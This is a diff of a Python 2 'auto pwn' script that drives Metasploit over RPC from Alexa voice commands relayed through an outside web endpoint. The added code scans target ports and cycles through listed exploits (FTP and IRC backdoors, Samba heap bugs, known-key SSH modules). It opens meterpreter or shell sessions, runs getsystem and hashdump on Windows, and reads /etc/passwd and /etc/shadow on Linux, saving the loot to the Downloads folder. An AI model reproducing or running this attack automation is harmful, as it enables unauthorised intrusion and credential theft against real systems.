@@ -1,5 +1,39 @@
 #!/usr/bin/env python
+#   HackerMode 2 Auto pwn for Kali and pymetasploit and msfrpcd
+#   Copyright (C) 2019 David Cross
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+def toascii (ustring):
+    return unicodedata.normalize('NFKD', ustring).encode('ascii','ignore')
+
+def write_loot_to_downloads(loot,filnam):
+    home = os.path.expanduser("~")
+    finalpath = os.path.join(home,"Downloads")
+    try:
+        f = open(finalpath + '/' + filnam,'w+')
+        f.write(loot)
+        f.close()
+    except:
+        print("crap file didn't write to")
+
+print('HackerMode 2 "Death Star" Auto pwn for Kali and pymetasploit and msfrpcd')
+print('Copyright (C) 2019 David Cross')
+print('This program comes with ABSOLUTELY NO WARRANTY.')
+print('See <https://www.gnu.org/licenses/gpl-3.0.en.html> for more information.')
+print('This program is designed for Kali and Python 2.7 only.')
+
 import sys
+import os
+
 def print_no_newline(string):
     #import sys
     sys.stdout.write(string)
@@ -15,7 +49,7 @@ def myipaddress():
 try:
     from metasploit.msfrpc import MsfRpcClient
 except:
-    print("you need to instll pymetapsloit from github XSSNinja")
+    print("you need to instll pymetapsloit from https://github.com/xssninja/pymetasploit")
     sys.exit(1)
 
 try:
@@ -24,9 +58,6 @@ except:
     print("You need to install python nmap from whereveer it is on the net")
     sys.exit(1)
 
-#import simplejson as json
-#import urllib
-#import urllib2
 # these libraries should be all installed by default on Kali
 import json
 import requests
@@ -39,8 +70,8 @@ import unicodedata
 
 
 StopMeNow = False
-urlfromAlexa = 'https://{domain and path where file is hosted}/Kali_Read.php'
-urltoAlexa = 'https://{domain and path where file is hosted}/Kali2Alexa.php'
+urlfromAlexa = 'https://xss.ninja/Kali_ReadXA.php'
+urltoAlexa = 'https://xss.ninja/Kali2AlexaXA.php'
 print ('urlfromAlexa is: ' + urlfromAlexa)
 print ('urltoAlexa is: ' + urltoAlexa)
 alexaAPIKey = ''
@@ -56,8 +87,6 @@ shellres = ''
 getuidres = ''
 winlin = ''
 exploit =''
-#rhost ='192.168.1.56'
-#lhost ='192.168.137.197'
 rhost = ''
 lhost = ''
 payload= ''
@@ -72,16 +101,18 @@ sig=''
 prettyprint = 0
 responsetype = ''
 windows = "True" # assume windows until proven otherwise
+ 
 
 # log into the MSFRPCClient and try to keep it alive during the session (times out in a few min)
 # if we can't instantiate it then tell the user why and quit
 try:
-    cli = MsfRpcClient(username='msf',password ='test',ssl=False, port=55553)
+    cli = MsfRpcClient(username='msf',password ='test',ssl=False, port=55553)   #if need to change the username and password for msfrpc here is where you do it
 except:
-    print("Could not connect to MsrRPC service with username of 'msf' and password of 'test' on port 55553")
+    print("Could not connect to MsrRPC service with hard-coded user/pass try this in a new terminal> msfrpcd -S -f -U msf -P test")
     sys.exit(1)
 
 SomethingToSend = False
+
 #loop forever
 while (StopMeNow == False):
     #write response if any to Alexa first
@@ -109,23 +140,31 @@ while (StopMeNow == False):
     #---------------------------------------------------------------------------------------------
     if SomethingToSend == True:
         if (exploitres != ''):
+            exploitres = exploitres.replace("\r","")
             exploitres = exploitres.replace("\n","")
             exploitres = exploitres.replace("[*]","")
             exploitres = exploitres.replace("[]",'""')
             exploitres = exploitres.replace("\\"," slash ")
-            getuidres = getuidres.replace("\\"," slash ") # do this otherwise NodeJS can't remove the \v or \u000b no matter what replacing/cleaning code you use... which then throws a JSON exception 
+            getuidres = getuidres.replace("\r","")
             getuidres = getuidres.replace("\n","")
+            getuidres = getuidres.replace("\\"," slash ") # do this otherwise NodeJS can't remove the \v or \u000b no matter what replacing/cleaning code you use... which then throws a JSON exception 
+
+            shellres = shellres.replace("\n","")
+            shellres = shellres.replace("\r","")
+            shellres = shellres.replace("\\"," slash ")
+            
             exploitres = exploitres.replace("/"," ")
             exploitres = exploitres.replace("("," ")
             exploitres = exploitres.replace(")"," ")
-            exploitres = exploitres.replace("_"," ")
+            #exploitres = exploitres.replace("_"," ")
 
         cmd = '{"responsetype": "'+ responsetype + '", "openports": ['+ openports +'], "portscanres": "'+  portscanres + '", "exploitres": "'+  exploitres + '", "searchres": "'+  searchres + '", "usepayloadres": "'+  usepayloadres +'", "shellres": "'+  shellres + '", "getuidres": "'+  getuidres + '", "windows": "'+ windows +'", "exploit": "'+ exploit +'", "rhost": "'+ rhost +'", "lhost": "'+ lhost +'", "payload": "'+ payload +'", "rport": "'+ rport +'", "lport": "' + lport +'", "exploits": "' + exploits +'", "sessions": "'+ sessions + '", "postmodule": "'+ postmodule +'", "error": "'+  error +'", "mstatus": "'+ mstatus +'"}'
+        cmd2 = cmd.replace('\n>','')
         sig = 'sig=somesignature'
         print "!!!built cmd... sending to Alexa...\n"
 
-        print cmd
-        outpayload = {'cmd': cmd, 'sig': sig}
+        print cmd2
+        outpayload = {'cmd': cmd2, 'sig': sig}
         print "about to send payload: " + json.dumps(payload)
         
         try: 
@@ -157,7 +196,7 @@ while (StopMeNow == False):
         cmd = ctemp[0].lower()  # parse off the command name
         tsig = strsplit[1].split("=") # parse off the signature
         sig = tsig[1].lower()
-        print("<Alexa said>" + body + "</Alexa said>")
+        #print("<Alexa said>" + body + "</Alexa said>")
         #parse body into a dictionary containing the exploit list and ports for the exploit
         tbody= body.split("=")
         try:
@@ -165,7 +204,7 @@ while (StopMeNow == False):
             varz = json.loads(body)
             #dbody= json.loads(tbody[1])
         except:
-            print("failed to JSONIFY the command body into a list of lists")
+            print("!!!!!!!failed to JSONIFY the command body into a list of lists!!!!!!")
         
         print ("body = " + body)
         print ("command =" + cmd) 
@@ -204,12 +243,9 @@ while (StopMeNow == False):
             error = "No open ports"      # if error = "No open ports" then the scan worked but the machine is firewalled.
             rhost = tip.replace("-",".")
             if stype == "light":
-                scanports = '21,22,23,110,113,1433,1635,445,8000'  #according to L0rdV4d3r,these 10 ports have highly exploitable exploits
-                #scanports = '23,25,53,80,443,445,1635,8000,8080,8888'  #according to L0rdV4d3r,these 10 ports have highly exploitable exploits
-                #But we don't want port 80 or 8080 because these are typically web servers or services that require multi-stage attacks
-                #like getting a file on someone's computer or getting a user to click a link.
+                scanports = '6667,8000,1433,1635,1524,445,22,23,8080,21'  #quick ports to hit interesting exploits
             if stype == "medium":
-                scanports = '21,22,23,25,53,80,110,111,113,137,443,445,1635,8000,8080,8888'
+                scanports = '8888,8000,6667,1635,1524,445,22,23,25,53,80,21,110,139,443,8080'
             if stype == "large":
                 scanports = '0-35555'
                 
@@ -263,18 +299,49 @@ while (StopMeNow == False):
             # trigger the send on the next loop
             SomethingToSend = True
         
-        ##### USE PAYLOAD command
-        if cmd == 'use payload':
+        ##### USE EXPLOIT command executes a singular exploit
+        if cmd == 'use exploit':
             #use payload
-            print "Setting payload"
+            print "Setting exploit"
+            expl = unicodedata.normalize('NFKD', varz['exploit']).encode('ascii','ignore')
+            rport = unicodedata.normalize('NFKD', varz['port']).encode('ascii','ignore')
+            #for expl, rport in z.iteritems():
+            print("Exploit from Alexa=" + expl +"")
+            print(type(expl))
+            print("Rport from Alexa=" + rport)
+            try:
+                ex = cli.modules.use('exploit', expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')
+                print ("Exploit " + expl + " set successfully!")
+            except:
+                print ("Exploit set to " + expl + " failed! Moving on to next candidate exploit.")
+                continue
+            # preapre to send payloads back to Alexa and prompt user to pick which one
+            payloads = ex.payloads
+            if len(payloads) > 0:
+                print ("We have payloads!")
+                #    error ="Success"
+                #    mstatus="Sucess"
+                #    payload = payloads
+                #trigger the exploit section with varz having only one exploit selected
+                cmd == 'exploit'
+            else: 
+                payload = "None"
+                error = "Fail"
+                mstatus = "Fail"
+                SomethingToSend = True
+                continue                # resume the application loop which will have the effect of sending the message back to Alexa of the failure
+
             
         ##### USE POST-EXPLOIT module command
         if cmd == 'use post-exploit module':
             #use post exploit module
             print "Use post exploit module"
 
+ 
+
         ## !! ### use  E X P L O I Ts command ------------------------->            
         if cmd == 'exploit':
+            # varz= json.loads('[{"exploit":"linux/samba/setinfopolicy_heap", "port":"445"},{"exploit":"linux/samba/lsa_transnames_heap", "port":"445"},{"exploit":"linux/telnet/telnet_encrypt_keyid", "port":"23"},{"exploit":"unix/ftp/vsftpd_234_backdoor", "port":"21"},{"exploit":"unix/ftp/proftpd_133c_backdoor", "port":"21"},{"exploit":"unix/irc/unreal_ircd_3281_backdoor", "port":"6667"},{"exploit":"linux/ftp/proftp_sreplace", "port":"21"}, {"exploit":"linux/ftp/proftp_telnet_iac", "port":"21"}, {"exploit":"linux/ssh/ceragon_fibeair_known_privkey", "port":"22"}, {"exploit":"linux/ssh/exagrid_known_privkey", "port":"22"}, {"exploit":"linux/ssh/f5_bigip_known_privkey", "port":"22"}, {"exploit":"linux/ssh/loadbalancerorg_enterprise_known_privkey", "port":"22"}, {"exploit":"linux/ssh/quantum_dxi_known_privkey", "port":"22"}, {"exploit":"linux/ssh/quantum_vmpro_backdoor", "port":"22"}, {"exploit":"linux/ssh/symantec_smg_ssh", "port":"22"}, {"exploit":"unix/ssh/array_vxag_vapv_privkey_privesc", "port":"22"}, {"exploit":"unix/ssh/tectia_passwd_changereq", "port":"22"}]')
             # cmd should say exploit
             # dbody should contain list of exploits to scan with their rport numbers
             # sig should contain the hash versus the shared secret and the body string
@@ -283,65 +350,101 @@ while (StopMeNow == False):
             print("rhost =" + rhost)
             
             # we have already established a connection to MSFCli so go ahead and start looping through exploits and rports
-            # loading a list like: '[{"windows/http/icecast_header": "8000"},{"windows/http/blueborne": "445"}]'
+            # loading a list like: '[{"exploit": "windows/http/icecast_header", "port": "8000"},{"exploit": "exploit/windows/smb/ms17_010_eternalblue", "port": "445"}]'
+            # loop through each payload until we're done
             for z in varz:
                 expl = unicodedata.normalize('NFKD', z['exploit']).encode('ascii','ignore')
                 rport = unicodedata.normalize('NFKD', z['port']).encode('ascii','ignore')
                 #for expl, rport in z.iteritems():
-                print("Exploit from Alexa=" + expl +"") # can drop in a pipe on either side to see if the exploit name is trimmed properly
+                print("Exploit from Alexa=" + expl +"")
                 print(type(expl))
                 print("Rport from Alexa=" + rport)
+                try:
+                    ex = cli.modules.use('exploit', expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')
+                    print ("Exploit " + expl + " set successfully!")
+                except:
+                    print ("Exploit set to " + expl + " failed! Moving on to next candidate exploit.")
+                    continue
                 
-                #ex = cli.modules.use('exploit','exploit/'+expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')
-                ex = cli.modules.use('exploit', expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')
-
-                print "Exploit set successfully!"
                 payloads = ex.payloads
                 if len(payloads) > 0:
-                    print "We have payloads!"
-##                    ex.execute(payload='windows/meterpreter/bind_tcp')
-##                    print "set payload to meterpreter"
-                # else ex.execute(payload='linux/x86/meterpreter/reverse')
-                # print ex.description
-                ex['RHOSTS'] = rhost 	# typically '192.168.1.x' MS5 rhost to rhosts!!! can now be set to cidr block 192.168.0.0/24
-                print 'rhost=' + rhost
+                    print ("We have payloads!")
+            
+                try:
+                    ex['RHOSTS'] = rhost 	# typically '192.168.1.x' MS5 rhost to rhosts!!! can now be set to cidr block 192.168.0.0/24
+                except:
+                    ex['RHOST'] = rhost
+                
+                print ('rhost(s)=' + rhost)
                 if any("RPORT" in s for s in ex.required):
-                    ex['RPORT'] = int(rport) 	# typically 8000
-                print 'rport= %i', ex['RPORT']
+                    ex['RPORT'] = int(rport) 	
+                print ('rport= %i', ex['RPORT'])
                     # ex['VERBOSE']= True
                 if any("ConnectTimeout" in s for s in ex.required):
                     ex['ConnectTimeout'] = 10
-                    print "ConnTO=%i", ex['ConnectTimeout']
+                    print ("ConnTO=%i", ex['ConnectTimeout'])
                 if any("SSLVersion" in s for s in ex.required):
                     ex['SSLVersion'] = 'TLS1.2'
-                    print 'SSL ver=' + ex['SSLVersion']
+                    print ('SSL ver=' + ex['SSLVersion'])
                 if any("LHOST" in s for s in ex.required):
                     ex['LHOST'] = lhost	# 192.168.137.X
-                    print 'LHOST is ' + ex['LHOST']
+                    print ('LHOST is ' + ex['LHOST'])
                 if any("LPORT" in s for s in ex.required):
                     if lport == 0: lport = 4000
                     ex['LPORT'] = int(lport) 	# typically 4000
-                    print 'LPORT is %i', ex['LPORT']
+                    print ('LPORT is %i', ex['LPORT'])
+                if any("PROCESSINJECT" in s for s in ex.required):
+                    ex['PROCESSINJECT'] = 'explorer.exe' 	# typically explorer.exe
+                    print ('PROCESSINJECT is ', ex['PROCESSINJECT'])
+                if any("TARGETARCHITECTURE" in s for s in ex.required):
+                    ex['TARGETARCHITECTURE'] = 'x32' 	# typically explorer.exe
+                    print ('TARGETARCHITECTURE is ', ex['TARGETARCHITECTURE'])
+
+
                 # get input to continue
                 #raw_input("Press Enter to start " + expl + ":" + rport)
-                print ("Attempting to print ex to the console:")
-                print (ex)
-                # linux/x86/meterpreter/reverse_tcp <for Linux for 32 and 64 bit>
-                # TODO: If windows then 
-                ex.execute(payload='windows/meterpreter/bind_tcp')
-                # else ex.execute(payload='linux/x86/meterpreter/reverse')
-                print "Executing payload\n"
+                #print ("Attempting to print ex to the console:\n")
+                #print (ex)
+                print ('possible payloads number:')
+                print (len(payloads))
+                #print (payloads)
+
+                if windows == "True": 
+                    print ('Windows')
+                    #ex.execute(payload='windows/meterpreter/reverse_tcp')
+                    if any('windows/meterpreter/bind_tcp' in p for p in payloads):
+                        payload = 'windows/meterpreter/bind_tcp'
+                        ex.execute(payload=payload)
+                    elif any('windows/x64/meterpreter/bind_tcp' in p for p in payloads):    
+                        payload='windows/x64/meterpreter/bind_tcp'
+                        ex.execute(payload=payload)
+                    else: ex.execute(payload=ex.payloads[2]) # would be generic/shell_bind_tcp
+                else: # must be in Linux
+                    print('Linux\n')
+                    if 'custom' not in ex.payloads[0]:  # in Win payload[0] is usually a custom payload... in lin it's often a regular shell
+                        payload = ex.payloads[0] 
+                    else:
+                        if len(payloads) >= 1: 
+                            payload = ex.payloads[1]
+
+                    ex.execute(payload=payload)  # ex.payloads is a list of strings 0 is a basic in linux but payloads[0] in win is custom
+                    # most of the time a friendly payload is already selected
+                    # and metasploit will rotate through a few in order
+                    #ex.execute(payload='linux/x86/meterpreter/reverse_tcp')
+                print('Preparing to execute payload: <' + payload + '>\n')
                 idstr = ''
                 id = 0
-                time.sleep(3)  #wait 3 seconds and try the shell
+                time.sleep(1)
                 sys.stdout.flush()
-                print cli.sessions.list
+                time.sleep(1)  #wait 3 seconds and try the shell
+
+                print ("Number of sessions=", len(cli.sessions.list))
                 #wait patiently for a meterpreter session
-                for loop in range(10):
-                    time.sleep(1)
-                    print cli.sessions.list
+                for loop in range(5):
+                    time.sleep(2)
+                    print (cli.sessions.list)
                     if len (cli.sessions.list) > 0:
-                        print "Got a session after %i seconds", loop +1
+                        print ("Got a session after %i seconds", loop +1)
                         break
                 #start pwning
                 if len (cli.sessions.list) > 0:
@@ -351,10 +454,10 @@ while (StopMeNow == False):
                     exploitres = "Success"
                     mstatus = "exploit successful"
                     sessions = idstr
-                    print "Session id = " + str(id)
+                    print ("Session id = " + str(id))
                     #sys.stdout.flush() # if we do the flush it kills things, idk why
                 else:
-                    print "Exploit failed. Session was not created for " + expl
+                    print ("Exploit failed. Session was not created for " + expl)
                     mstatus = "exploit failed a session was not created at this time"
                     exploitres = "Fail"
                     sessions = ""
@@ -362,48 +465,115 @@ while (StopMeNow == False):
                     continue  #just move on to the next exploit in the dictionary until we run out
                 if id > 0:
                     shell = cli.sessions.session(id)
-                    shell.write('getuid\n')
+                    if windows == "True":
+                        print('sending getuid to Windows')
+                        shell.write('getuid\n')  # getuid is Meterpreter specific use whoami
+                    else:
+                        print('sending id to Linux')
+                        shell.write('id\n')
                     time.sleep(0.5)
-                    getuidres = shell.read()                
-                    sys.stdout.flush()
+                    getuidres = shell.read() 
+                    print ("You are " + getuidres)               
+#                    sys.stdout.flush()
                     exploitres ="success"
                     # if Windows
                     if windows == "True":
-                        shell.write('getsystem\n')
-                        shellres = shell.read()    #'...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n'
-                        sys.stdout.flush()
-                        print 'get  system =', shellres
+                        if 'SYSTEM' not in getuidres:       #if we aren't SYSTEM then try to get system so we can dump hashes
+                            shell.write('getsystem\n')
+                            shellres = shell.read()    
+                            sys.stdout.flush()
+                            print ('get  system says: ' + shellres)
+
                         shell.write('run post/windows/gather/hashdump\n')
+                        passdump = shell.read()
+                        #wait patiently for a meterpreter session
+                        loopcount = 0
+                        while ':::\n\n\n' not in passdump:
+                            time.sleep(1)
+                            passdump += shell.read()
+                            #if (datetime.now()-t1).seconds > 8:		## careful here because Alexa times out in 8 seconds!
+                            if loopcount > 15 : break
+                        print ("Done!\n" + passdump)
+                        # save it to a file
+                        
+                        write_loot_to_downloads(passdump,"winpasswd.txt")
+                        # clean it up so Alexa can read it without reading a bunch of numbers and crap
+                        exploitres = passdump.replace("\\"," backslash ")
+                        exploitres = exploitres.replace("\\n"," ")
+                        sessions= "1"
+                        postmodule = "hashdump"
+                        sys.stdout.flush()
+                        shell.write('exit')
+                        print ("closed shell")
                     elif windows == "False": # ex it's Linux
-                        shell.write('run post/linux/gather/hashdump\n')
-                    else:
-                        print "Var windows was not set to an expected value: '"
-                        print windows
-                        print type(windows)
-                    # Huge loop of shell-reads until a big blob starting with '[*] Obtaining the boot key...\n
-                    # and ending with :::\n\n\n'
-                    passdump = shell.read()
-                    #t1 = datetime.now()
-                    #wait patiently for a meterpreter session
-                    loopcount = 0
-                    while ':::\n\n\n' not in passdump:
-                        time.sleep(1)
-                        passdump += shell.read()
-                        #if (datetime.now()-t1).seconds > 8:		## careful here because Alexa times out in 8 seconds!
-                        if loopcount > 15 : break
-                    print "Done!\n" + passdump
-                    exploitres = passdump.replace("\\"," backslash ")
-                    exploitres = exploitres.replace("\\n"," ")
-                    sessions= "1"
-                    postmodule = "hashdump"
-                    sys.stdout.flush()
-                    shell.write('exit')
-                    print "closed shell"
+                        #shell.write('run post/linux/gather/hashdump\n')
+                        shell.write('id\n')
+                        shellres = shell.read()
+                        sys.stdout.flush()
+                        print('id = ' + shellres)
+
+                        print("Getting user accounts on linux console.\n")
+                        #shell.write("cat /etc/passwd && cat /etc/shadow && echo '>'\n")
+                        shell.write("cat /etc/passwd && echo '>'\n")
+                        loopcount = 0
+                        passdump = ""
+                        while '>' not in passdump:
+                            time.sleep(1)
+                            passdump += shell.read()
+                            if loopcount > 15 : break
+                        print ("Done!\n" + passdump)
+                        passdump2 = passdump.replace('\n>','')
+                        #passdump = shell.read()
+                        passdump.rstrip('>')
+                        write_loot_to_downloads(passdump,"passwd.txt")
+
+                        shell.write("cat /etc/shadow && echo '>'\n")
+                        loopcount = 0
+                        shadowdump = ""
+                        while '>' not in shadowdump:
+                            time.sleep(1)
+                            shadowdump += shell.read()
+                            if loopcount > 15 : break
+                        print ("Done!\n" + shadowdump)
+                        
+                        #shadowdump = shell.read()
+                        shadowdump2 = shadowdump.replace('\n>','')
+
+                        write_loot_to_downloads(shadowdump,"shadow.txt")
+                        # handle Unix flavor of user/hash data from the shell
+
+                        sessions= "1"
+                        postmodule = "pass and shadow"
+                        sys.stdout.flush()
+                        shell.write('exit')
+                        print ("closed shell")
+                        # take the user up to the :x and throw the rest away
+                        #syslog:*:14684:0:99999:7:::
+                        #klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+                        #exploitres = passdump.replace(",","")
+                        #exploitres = exploitres.replace("\\n"," ")
+                        exploitres=""
+                        shadowdump = shadowdump2.split('\n')
+                        for usr in shadowdump:
+                            print ("usr=" + usr)
+                            er = usr.split(':')
+                            print ("er=" + er[0])
+                            try:
+                                if len(er[1]) > 1: # found a username but not one with a hash
+                                    exploitres += toascii(er[0]) + " "
+                            except:
+                                continue 
+                        exploitres = "See your downloads directory for hashes for the users " + exploitres
+                        print("Exploitres=" + exploitres)
+ 
+
+                    #alexa will read out whatever loot is in the exploitres variable, but it must be in a friendly format
                     if passdump != '':
-                        mstatus = "I successfully retrieved user names and hashes and took the liberty of printing them to your Kali terminal."
+                        mstatus = "I successfully retrieved users and copied them to your Downloads folder."
                     else:
-                        mstatus = "failed to retrieve accounts from the target"
+                        mstatus = "I failed to retrieve accounts from the target."
                     responsetype = "exploitres"       #{portscanres, exploitres, searchres, usepayloadres, shellres}
+
                     SomethingToSend=True
                     break  # (NEW) break out of the look around the full exploit set if we got a shell!
                 #else continue
